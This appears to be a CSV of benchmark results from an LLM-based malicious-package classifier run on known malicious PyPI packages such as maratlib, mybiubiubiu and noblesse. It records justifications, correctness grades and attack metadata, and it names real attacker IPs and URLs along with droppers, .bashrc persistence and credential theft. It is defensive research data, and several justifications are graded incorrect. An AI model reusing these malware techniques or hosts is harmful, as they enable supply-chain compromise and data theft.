Package Name,version,Objective,Details,justification,justification_correctness,objective_capture_correctness,groundtruth,package_size,classification,package_name,classification_id,package_name-2,package_metadata,Location of malicious snippet_groudthruth,suspicious_files_MAMPD,created_at,updated_at,prompt_id,model,dataset_id,experiment_id,Type,Affected Version,Published,Reported,Sample,files match,Injection Component,Obfuscation,Trigger,Conditional,Targeted OS,Source,Comment,Typo Target,Campaign,,
libpeshnx,0.1,['dropper'],Download file and persist in .bashrc,"The package 'libpeshnx' contains a function that downloads a file from a remote server ('http://145.249.104.71/out'), potentially indicating malicious behavior. The code also modifies the user's .bashrc file to execute the downloaded file, which is a clear sign of trying to maintain persistence or execute malicious code without the user's consent",Correct,Correct,malicious,1868,malicious,libpeshnx-0.1.tar.gz,4e6c59e9-b921-43ad-9865-9e1c57442612,libpeshnx,"{""model_type"": ""gemini"", ""author_name"": ""Ruri12"", ""author_email"": ""ruri12@example.com"", ""num_of_files"": 10, ""package_name"": ""libpeshnx"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Libari wrapper for python"", ""package_version"": ""0.1"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The package 'libpeshnx' contains a function that downloads a file from a remote server ('http://145.249.104.71/out'), potentially indicating malicious behavior. The code also modifies the user's .bashrc file to execute the downloaded file, which is a clear sign of trying to maintain persistence or execute malicious code without the user's consent.\"" suspicious_files=['pr.py']"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""pr.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/libpeshnx-0.1_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/libari/pr.py,{'pr.py'},2025-07-01 19:55:18.689977+00,2025-07-01 19:55:18.689977+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,4a9e7665-07b0-49ff-9087-ddbddb3c6abf,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.1'],2017-11-23T13:51:29,2019-07-17T00:00:00,yes,1,Trojan Horse,,runtime,['operating system'],['*nix'],https://blog.reversinglabs.com/blog/suppy-chain-malware-detecting-malware-in-package-manager-repositories,,,8,,
maratlib,0.2,['financial gain'],Bash scripts run cryptominers on compromised machines,"The package contains obfuscated code that executes a shell command to change permissions on a file, which is a common behavior in malicious packages. Additionally, the use of obfuscation techniques raises red flags about the package's intentions. The author information is marked as 'UNKNOWN', further contributing to the suspicion.",Incorrect,Incorrect,malicious,2035,malicious,maratlib-0.2.tar.gz,2a106fad-e3f6-4dd1-89f3-2e9639fe05ba,maratlib,"{""author_name"": ""UNKNOWN"", ""author_email"": ""b@gmail.com"", ""num_of_files"": 7, ""package_name"": ""maratlib"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""cum"", ""package_version"": ""0.2"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/maratlib-0.2_dump.json""}",setup.py,{setup.py},2025-06-28 09:19:01.673608+00,2025-06-28 09:19:01.673608+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,14ff7950-6f5c-4f97-a7dc-39b204a28168,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.2', '0.3', '0.4', '0.5', '0.6', '0.7', '0.8', '0.9', '1.0']",2021-04-20T19:35:17,2021-06-21T00:00:00,yes,1,Typosquatting,"['dependency confusion', 'encoding']",install,['unconditional'],['*nix'],https://blog.sonatype.com/sonatype-catches-new-pypi-cryptomining-malware-via-automated-detection,uses chmod -> Linux,matplotlib,43,,
maratlib,0.9,['financial gain'],Bash scripts run cryptominers on compromised machines,"The package contains code that downloads and executes a script from an external source (`https://github.com/nedog123/files/raw/main/seo.sh`), potentially leading to unauthorized actions or malicious behavior. Additionally, the use of obfuscation techniques (e.g., unusual variable names and encryption-like transformations) indicates an intent to conceal its functionality.",Correct,Incorrect,malicious,1728,malicious,maratlib-0.9.tar.gz,a58d46d7-2031-4239-931f-e59d42effd9e,maratlib,"{""author_name"": ""UNKNOWN"", ""author_email"": ""b@gmail.com"", ""num_of_files"": 7, ""package_name"": ""maratlib"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""lalala"", ""package_version"": ""0.9"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/maratlib-0.9_dump.json""}",setup.py,{setup.py},2025-06-28 11:04:13.970229+00,2025-06-28 11:04:13.970229+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,d5109dab-bde4-46a3-82e2-1312da31f021,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.2', '0.3', '0.4', '0.5', '0.6', '0.7', '0.8', '0.9', '1.0']",2021-04-20T19:35:17,2021-06-21T00:00:00,yes,1,Typosquatting,"['dependency confusion', 'encoding']",install,['unconditional'],['*nix'],https://blog.sonatype.com/sonatype-catches-new-pypi-cryptomining-malware-via-automated-detection,uses chmod -> Linux,matplotlib,43,,
maratlib,1,['financial gain'],Bash scripts run cryptominers on compromised machines,"The presence of obfuscated code and the use of functions to dynamically evaluate strings (e.g., `eval`) strongly suggest malicious intent. The code appears to manipulate input and execute potentially harmful actions. Additionally, the lack of proper documentation and misleading variable names indicate attempts to obscure the code's true purpose.",Correct,Incorrect,malicious,49425,malicious,maratlib-1.0.tar.gz,623b6180-3b73-4219-81d4-c472f541da81,maratlib,"{""author_name"": ""UNKNOWN"", ""author_email"": ""b@gmail.com"", ""num_of_files"": 7, ""package_name"": ""maratlib"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""lalala"", ""package_version"": ""1.0"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/maratlib-1.0_dump.json""}",setup.py,{setup.py},2025-06-28 12:58:13.826478+00,2025-06-28 12:58:13.826478+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,49d40f02-d13a-4bfd-934e-e84b4754772f,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.2', '0.3', '0.4', '0.5', '0.6', '0.7', '0.8', '0.9', '1.0']",2021-04-20T19:35:17,2021-06-21T00:00:00,yes,1,Typosquatting,"['dependency confusion', 'encoding']",install,['unconditional'],['*nix'],https://blog.sonatype.com/sonatype-catches-new-pypi-cryptomining-malware-via-automated-detection,uses chmod -> Linux,matplotlib,43,,
maratlib,0.3,['financial gain'],Bash scripts run cryptominers on compromised machines,"The package 'maratlib' contains code that downloads and executes a shell script from an external source ('https://github.com/nedog123/files/raw/main/aza-ob.sh'), which is a common behavior indicative of malicious software. Furthermore, the obfuscation of function names and use of dynamic evaluation (eval) are additional red flags that suggest the intent to conceal harmful actions.",Correct,Incorrect,malicious,1739,malicious,maratlib-0.3.tar.gz,326a8ea7-e434-401d-8c81-7a13d25c1c4b,maratlib,"{""model_type"": ""gemini"", ""author_name"": ""UNKNOWN"", ""author_email"": ""b@gmail.com"", ""num_of_files"": 7, ""package_name"": ""maratlib"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""cum"", ""package_version"": ""0.3"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The package 'maratlib' contains code that downloads and executes a shell script from an external source ('https://github.com/nedog123/files/raw/main/aza-ob.sh'), which is a common behavior indicative of malicious software. Furthermore, the obfuscation of function names and use of dynamic evaluation (eval) are additional red flags that suggest the intent to conceal harmful actions.\"" suspicious_files=['setup.py']"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/maratlib-0.3_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",setup.py,{['setup.py'},2025-07-01 19:35:26.534442+00,2025-07-01 19:35:26.534442+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,19502e54-da68-450e-b9f8-6e4e63e8b639,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.2', '0.3', '0.4', '0.5', '0.6', '0.7', '0.8', '0.9', '1.0']",2021-04-20T19:35:17,2021-06-21T00:00:00,yes,1,Typosquatting,"['dependency confusion', 'encoding']",install,['unconditional'],['*nix'],https://blog.sonatype.com/sonatype-catches-new-pypi-cryptomining-malware-via-automated-detection,uses chmod -> Linux,matplotlib,43,,
maratlib1,0.1,['financial gain'],Bash scripts run cryptominers on compromised machines,"The `setup.py` file contains obfuscated code that uses an eval statement, which is a common technique for executing dynamically constructed code. Additionally, it prints the current user using `os.system('whoami')`, which indicates potential malicious behavior by attempting to gather information about the environment it operates in. The presence of obfuscation and use of powerful functions like eval is a strong indicator of malicious intent.",Incorrect,Incorrect,malicious,1643,malicious,maratlib1-0.1.tar.gz,cdfd5a1c-f84d-420a-85ed-191205e99c81,maratlib1,"{""author_name"": ""UNKNOWN"", ""author_email"": ""b@gmail.com"", ""num_of_files"": 7, ""package_name"": ""maratlib1"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""cum"", ""package_version"": ""0.1"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/maratlib1-0.1_dump.json""}",setup.py,{setup.py},2025-06-28 11:06:01.540072+00,2025-06-28 11:06:01.540072+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,f7f7befe-5205-43b4-8833-53ddd95030a6,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.1'],2021-04-22T17:55:22,2021-06-21T00:00:00,yes,1,Typosquatting,"['dependency confusion', 'encoding']",install,['unconditional'],['*nix'],https://blog.sonatype.com/sonatype-catches-new-pypi-cryptomining-malware-via-automated-detection,uses chmod -> Linux,matplotlib,43,,
mplatlib,1,['financial gain'],Bash scripts run cryptominers on compromised machines,"The package 'mplatlib' has no known author, homepage, or description, which raises red flags. It also uses an obfuscated setup script that imports 'setuptools' for installation but contains no actual functionalities or modules, suggesting it may be designed to pull malicious dependencies through the 'install_requires' field. The absence of legitimate metadata implies that it could potentially be used for harmful purposes.",Incorrect,Incorrect,malicious,11492,malicious,mplatlib-1.0.tar.gz,fd992017-9d3b-4c42-bf15-9a0b8487634f,mplatlib,"{""author_name"": ""UNKNOWN"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 7, ""package_name"": ""mplatlib"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""___-___"", ""package_version"": ""1.0"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/mplatlib-1.0_dump.json""}",setup.py,{setup.py},2025-06-28 09:59:32.52845+00,2025-06-28 09:59:32.52845+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,a67608a4-cf8d-477c-b3b4-73bc69a06dc2,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0'],2021-04-26T15:24:16,2021-06-21T00:00:00,yes,1,Typosquatting,"['dependency confusion', 'encoding']",install,['unconditional'],['*nix'],https://blog.sonatype.com/sonatype-catches-new-pypi-cryptomining-malware-via-automated-detection,uses chmod -> Linux,matplotlib,43,,
mumpy,0.1,['data exfiltration'],Uploads username & hostname & ip to remote host.,"The setup script for the package includes suspicious behavior that collects environment information and sends it to an external server (packageman.comlu.com). This includes using socket connections to transmit potentially sensitive data, which is characteristic of malicious intent",Correct,Correct,malicious,1214,malicious,mumpy-0.1.tar.gz,ac79b9ee-b0c3-4ce0-aa0c-723a4b100c81,mumpy-0.1.tar.gz,"{""model_type"": ""gemini"", ""author_name"": null, ""author_email"": null, ""num_of_files"": 1, ""package_name"": ""mumpy-0.1.tar.gz"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": null, ""package_version"": null, ""package_homepage"": null, ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The setup script for the package includes suspicious behavior that collects environment information and sends it to an external server (packageman.comlu.com). This includes using socket connections to transmit potentially sensitive data, which is characteristic of malicious intent.' suspicious_files=['setup.py']"", ""num_of_python_files"": 1, ""package_description"": null, ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/mumpy-0.1_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,{['setup.py'},2025-07-01 19:47:25.752325+00,2025-07-01 19:47:25.752325+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,a02af24a-f71d-4cf3-adff-bdb16bfcd967,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.1'],2016-03-03T15:57:44,2018-12-12T17:23:30,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://github.com/rsc-dev/pypi_malware,,numpy,9,,
mybiubiubiu,0.1.4,['data exfiltration'],send username+hostname+ip+package_name+language+local_time to a web server,"The package contains code that collects sensitive information such as the username, hostname, and IP address, and sends this data to a remote server (`http://123.206.22.33:5000/p/`). It attempts to mask its behavior by checking if a file exists before sending the data, but the explicit gathering and transmission of user information is malicious behavior.",Correct,correct,malicious,4960,malicious,mybiubiubiu-0.1.4.tar.gz,1b54fb72-3f3d-4ea9-a8e6-8e56e9590f5b,mybiubiubiu,"{""author_name"": ""biubiubiu"", ""author_email"": ""biubiubiu2@yopmail.com"", ""num_of_files"": 9, ""package_name"": ""mybiubiubiu"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""change some functions"", ""package_version"": ""0.1.4"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 3, ""package_description"": ""mybiubiubiu"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""test_{{cookiecutter.package_name}}.py""], ""package_formatted_path"": "".temp/plain/mybiubiubiu-0.1.4_dump.json""}",/setup.py,{setup.py},2025-06-28 10:38:11.310633+00,2025-06-28 10:38:11.310633+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,a7d09a06-8b43-435b-9f77-d5ef757da993,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.0', '0.1.1', '0.1.2', '0.1.3', '0.1.4', '0.1.6']",2017-06-06T01:20:14,2018-10-13T00:00:00,yes,1,Trojan Horse,,install,['unconditional'],['*nix'],https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67,,,,,
mybiubiubiu,0.1.6,['data exfiltration'],send username+hostname+ip+package_name+language+local_time to a web server,"The setup.py script contains functionality that collects user information (username, hostname, and IP address) and sends it to a remote server (http://123.206.22.33:5000/p/). This behavior is typical of malicious software that seeks to exfiltrate sensitive data without user consent. Additionally, it makes network requests and utilizes the user's machine to execute potentially harmful actions without clear disclosure in the package's summary or description.",Correct,correct,malicious,4889,malicious,mybiubiubiu-0.1.6.tar.gz,d3dc12cc-4479-485e-95da-543a1ff46a77,mybiubiubiu,"{""author_name"": ""biubiubiu"", ""author_email"": ""biubiubiu2@yopmail.com"", ""num_of_files"": 9, ""package_name"": ""mybiubiubiu"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""change some functions"", ""package_version"": ""0.1.6"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 3, ""package_description"": ""mybiubiubiu"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""test_{{cookiecutter.package_name}}.py""], ""package_formatted_path"": "".temp/plain/mybiubiubiu-0.1.6_dump.json""}",/setup.py,{setup.py},2025-06-28 13:11:23.742291+00,2025-06-28 13:11:23.742291+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,52ed6e07-1891-4895-8eb0-0506884f1bf4,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.0', '0.1.1', '0.1.2', '0.1.3', '0.1.4', '0.1.6']",2017-06-06T01:20:14,2018-10-13T00:00:00,yes,1,Trojan Horse,,install,['unconditional'],['*nix'],https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67,,,,,
mybiubiubiu,0.1.1,['data exfiltration'],send username+hostname+ip+package_name+language+local_time to a web server,"The package contains a function that collects and sends sensitive information (username, hostname, IP address) to a remote server over HTTP, which is a common behavior in malicious software (malware). It also attempts to execute arbitrary code by writing a PHP script to a file, which could potentially allow for remote command execution",Correct,Correct,malicious,8345,malicious,mybiubiubiu-0.1.1.tar.gz,cb7ae336-2d53-4656-ae80-cb83844110a2,mybiubiubiu,"{""model_type"": ""gemini"", ""author_name"": ""biubiubiu"", ""author_email"": ""biubiubiu2@yopmail.com"", ""num_of_files"": 10, ""package_name"": ""mybiubiubiu"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""test my function"", ""package_version"": ""0.1.1"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The package contains a function that collects and sends sensitive information (username, hostname, IP address) to a remote server over HTTP, which is a common behavior in malicious software (malware). It also attempts to execute arbitrary code by writing a PHP script to a file, which could potentially allow for remote command execution.' suspicious_files=['setup.py', 'test.py']"", ""num_of_python_files"": 4, ""package_description"": ""{{ cookiecutter.package_name }}"", ""available_python_files"": [""setup.py"", ""test.py"", ""__init__.py"", ""test_{{cookiecutter.package_name}}.py""], ""package_formatted_path"": "".temp/plain/mybiubiubiu-0.1.1_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,"['setup.py', 'test.py']",2025-07-01 19:54:52.755093+00,2025-07-01 19:54:52.755093+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,5ec96071-b62a-4208-bef7-d74a106e11a4,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.0', '0.1.1', '0.1.2', '0.1.3', '0.1.4', '0.1.6']",2017-06-06T01:20:14,2018-10-13T00:00:00,yes,1,Trojan Horse,,install,['unconditional'],['*nix'],https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67,,,,,
noblesse,0.0.5,['data exfiltration'],Steals Discord tokens  Passwords from chrome  edge  system information. Uploaded via webhook,"The package appears to be a selfbot for Discord which can manage user interactions, send spam messages, and redeem Discord Nitro codes. Additionally, it contains modules for interacting with Discord's API in ways that violate their terms of service, including functionalities for direct message spam, group channel access, and user management operations like leaving and deleting guilds, and removing friends. The presence of functions like 'webhook_spam' and 'flood' raises significant concerns regarding its purpose, leading to the conclusion that this package is malicious.",Incorrect,Incorrect,malicious,14322,malicious,noblesse-0.0.5.tar.gz,cb696c9b-426f-4d2c-9e19-a0cb1d514be7,noblesse,"{""author_name"": ""sipher"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""noblesse"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""This Module Optimises your PC For Python"", ""package_version"": ""0.0.5"", ""package_homepage"": ""https://github.com/siph-er"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""noblesse.py""], ""package_formatted_path"": "".temp/plain/noblesse-0.0.5_dump.json""}",/src/noblesse.py,{noblesse.py},2025-06-28 11:59:39.415539+00,2025-06-28 11:59:39.415539+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,485f8574-5abc-45fc-a24e-8895239e11fb,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6']",,2021-07-29T00:00:00,yes,1,Trojan Horse,['encoding'],runtime,['unconditional'],['windows'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,from xin1111,,31,,
noblesse,0.0.2,['data exfiltration'],Steals Discord tokens  Passwords from chrome  edge  system information. Uploaded via webhook,"The `noblesse` module contains code that interacts with Discord APIs to log and handle messages, attachments, and Nitro codes, which are often associated with malicious activities such as stealing gift codes and user data. It also exhibits behavior typical of malware by creating directories for logging and spamming webhooks. Moreover, the use of `youtube_dl` and asynchronous requests indicates potential for downloading or manipulating media content illicitly.",Incorrect,Correct,malicious,16046,malicious,noblesse-0.0.2.tar.gz,47dd11c2-e1a6-476b-bed1-9987b18815e8,noblesse,"{""author_name"": ""sipher"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""noblesse"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""This Module Optimises your PC For Python"", ""package_version"": ""0.0.2"", ""package_homepage"": ""https://github.com/siph-er"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""noblesse.py""], ""package_formatted_path"": "".temp/plain/noblesse-0.0.2_dump.json""}",/src/noblesse.py,{noblesse.py},2025-06-28 13:08:02.439806+00,2025-06-28 13:08:02.439806+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,b558f241-770b-4fb1-a1bc-808f3364cb81,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6']",,2021-07-29T00:00:00,yes,1,Trojan Horse,['encoding'],runtime,['unconditional'],['windows'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,from xin1111,,31,,
noblesse,0.0.6,['data exfiltration'],Steals Discord tokens  Passwords from chrome  edge  system information. Uploaded via webhook,"The package 'noblesse' contains several functions that potentially indicate malicious behavior, particularly those related to Discord APIs and webhooks. Notably, the presence of functions such as 'check_nitro', 'leave_guild', 'remove_friend', and 'webhook_spam' suggests that this package can interact with Discord in ways that may violate terms of service, such as redeeming gift codes, leaving servers, removing friends, and spamming webhooks. Moreover, it includes methods to handle images and messages which could be used for unauthorized data scraping or phishing. The overall functionality points toward usage in the context of self-bots or unauthorized automation, which are generally considered malicious activities in user agreement contexts. Additionally, the use of asynchronous programming and libraries related to Discord also strengthens the suspicion of malicious intent.",Incorrect,Incorrect,malicious,13965,malicious,noblesse-0.0.6.tar.gz,dd714de3-8b78-4911-a499-a7da85bfb4a4,noblesse,"{""author_name"": ""sipher"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""noblesse"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""This Module Optimises your PC For Python"", ""package_version"": ""0.0.6"", ""package_homepage"": ""https://github.com/siph-er"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""noblesse.py""], ""package_formatted_path"": "".temp/plain/noblesse-0.0.6_dump.json""}",/src/noblesse.py,"{noblesse.py,setup.py}",2025-06-28 13:13:26.132895+00,2025-06-28 13:13:26.132895+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,bc159cd7-9628-4a66-bf26-35f12bec2d0f,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6']",,2021-07-29T00:00:00,yes,1,Trojan Horse,['encoding'],runtime,['unconditional'],['windows'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,from xin1111,,31,,
noblesse,0.0.1,['data exfiltration'],Steals Discord tokens  Passwords from chrome  edge  system information. Uploaded via webhook,"The package contains functionality that is indicative of malicious behavior, including logging Discord messages, handling Discord Nitro gift codes, and making unauthorized HTTP requests to Discord APIs. The presence of file logging in channels, handling attachments, and potential spamming behavior raises significant concerns about its purpose. Additionally, the code structure suggests it may be part of a bot designed for surreptitious operations rather than benign optimizations for PCs.",Correct,Incorrect,malicious,16019,malicious,noblesse-0.0.1.tar.gz,9ca59066-9b9f-45a1-8282-8ef93e9afbb4,noblesse,"{""model_type"": ""gemini"", ""author_name"": ""sipher"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""noblesse"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""This Module Optimises your PC For Python"", ""package_version"": ""0.0.1"", ""package_homepage"": ""https://github.com/siph-er"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The package contains functionality that is indicative of malicious behavior, including logging Discord messages, handling Discord Nitro gift codes, and making unauthorized HTTP requests to Discord APIs. The presence of file logging in channels, handling attachments, and potential spamming behavior raises significant concerns about its purpose. Additionally, the code structure suggests it may be part of a bot designed for surreptitious operations rather than benign optimizations for PCs.' suspicious_files=['noblesse.py', 'setup.py']"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""noblesse.py""], ""package_formatted_path"": "".temp/plain/noblesse-0.0.1_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/src/noblesse.py,"{['noblesse.py', 'setup.py'}",2025-07-01 19:57:05.752379+00,2025-07-01 19:57:05.752379+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,75b3e6bb-5394-45b7-96b1-814c0596f053,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6']",,2021-07-29T00:00:00,yes,1,Trojan Horse,['encoding'],runtime,['unconditional'],['windows'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,from xin1111,,31,,
noblesse2,0.0.1,['data exfiltration'],Steals Discord tokens  Passwords from chrome  edge  system information. Uploaded via webhook,"The package contains suspicious code that includes the use of dynamic code execution with the eval and exec functions, along with base64 decoding of potentially harmful data. It also imports multiple libraries including 'discord', which is often used in malicious contexts to create bots for various nefarious purposes, and the presence of obfuscation techniques suggests an attempt to hide malicious behavior.",Correct,Incorrect,malicious,47597,malicious,noblesse2-0.0.1.tar.gz,f6d5bccf-1b5c-4e23-97b3-5506fcc63b77,noblesse2,"{""author_name"": ""misery"", ""author_email"": ""predicc@protonmail.com"", ""num_of_files"": 12, ""package_name"": ""noblesse2"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Optimiser"", ""package_version"": ""0.0.1"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""noblesse2.py""], ""package_formatted_path"": "".temp/plain/noblesse2-0.0.1_dump.json""}",/src/noblesse2.py,"{noblesse2.py,setup.py}",2025-06-28 13:15:13.425786+00,2025-06-28 13:15:13.425786+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,1f4e920a-d94a-408f-9258-3102d5ef6383,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.0.1'],,2021-07-29T00:00:00,yes,1,Trojan Horse,['encoding'],runtime,['unconditional'],['windows'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,from suffer,,31,,
